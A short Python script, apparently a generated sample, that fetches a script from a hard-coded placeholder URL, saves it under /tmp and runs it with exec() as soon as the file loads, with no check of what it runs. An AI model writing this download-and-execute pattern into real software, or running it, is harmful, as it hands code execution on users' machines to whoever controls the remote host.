import requests
import os

def get_code_from_url(url):
    response = requests.get(url)
    return response.text

def save_code_as_file(filepath, content):
    with open(filepath, "w") as f:
        f.write(content)

def read_code_from_file(filepath):
    with open(filepath, "r") as f:
        return f.read()

def perform_execution(script):
    try:
        exec(script)
    except Exception as e:
        print(e)

def process_script(url, filepath):
    code = get_code_from_url(url)
    save_code_as_file(filepath, code)

    script_to_execute = read_code_from_file(filepath)
    perform_execution(script_to_execute)

def main():
    random_url = "http://random-url-70.com/script.py"
    local_file = "/tmp/script70.py"

    process_script(random_url, local_file)

main()
